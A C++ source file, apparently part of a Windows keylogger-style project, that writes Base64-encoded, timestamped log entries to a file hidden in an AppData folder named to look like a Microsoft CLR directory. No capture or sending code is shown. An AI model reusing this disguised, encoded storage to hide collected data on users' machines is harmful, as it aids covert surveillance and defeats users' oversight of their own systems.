#include <string>
#include <cstdlib>
#include <windows.h>
#include <stdio.h>
#include <fstream>
#include <sstream>
#include "Helper.h"
#include "Encryption.h"
#include "IO.h"

namespace IO
{
    
    std::string lastLogFileFullPath = "";
    bool logWriteSuccess = false;

    std::string GetTargetLogsDirPath(const bool append_seperator)
    {
        std::string appdataDir(getenv("APPDATA"));
        std::string full = appdataDir + "\\Microsoft\\CLR";
        return full + (append_seperator ? "\\" : "");
    }

    bool MakeOneDirectory( std::string path )
    {
        return (bool)CreateDirectory(path.c_str(), NULL) ||
        GetLastError() == ERROR_ALREADY_EXISTS;
    }

    bool DeleteFile( const std::string &f )
    {
        if (remove(f.c_str()) == 0)
            return true; // if succesful
        else
            return false; // if not succesful
    }

    bool MKDir( std::string path)
    {
        for (char &c : path)
        {
            if( c == '\\' )
            {
                c = '\0';
                if (!MakeOneDirectory(path))
                    return false;
                c = '\\';
            }
        }
        return true;
    }

    bool CheckFileExists(const std::string &f)
    {
        std::ifstream file(f);
        return (bool)file;
    }

    std::string GetLastLogPath()
    {
        return lastLogFileFullPath;
    }

    bool GetLogWriteSuccess()
    {
        return logWriteSuccess;
    }

    void WriteToLog (const std::string &stringToWrite)
    {
        logWriteSuccess = false;
        std::string logsPath = GetTargetLogsDirPath(true);

        Helper::DateTime dt;
        std::string fileName = "app.log";
        
        lastLogFileFullPath = logsPath + fileName;

        try
        {
            std::ofstream outFile(lastLogFileFullPath, std::ios::app);
            if (!outFile) 
            {
                //WriteDebugAppLog("Failed to open log file. Log file path: " + lastLogFileFullPath);
                return;
            }
            std::ostringstream outStringStream;
            outStringStream << "[" << (dt.GetDateTimeString(":", " | ")) << "]" <<
             std::endl << stringToWrite << std::endl;
            std::string outData = Encryption::EncryptB64(outStringStream.str());
            outFile << outData;
            if (!outFile)
            {
                //WriteDebugAppLog("Failed to stream data to log file.");
                return;
            }
            else
            {
                outFile.close();
                logWriteSuccess = true;
                return;
            }
        }
        catch(...)
        {
            logWriteSuccess = false;
            return;
        }   
    }

    // this is supposed to write logs, not needed for functioning of program
    //TODO: Fix error: 'DateTime' is not a member of 'Helper'
    void WriteDebugAppLog(const std::string &s)
    {
        std::ofstream outfile;
        outfile.open("ERROR_README.txt", std::ios::app);
        outfile << "[" << Helper::DateTime().GetDateTimeString(":", " | ") << "]"
                << "\n"
                << s << std::endl
                << "\n";
        outfile.close();
    }

}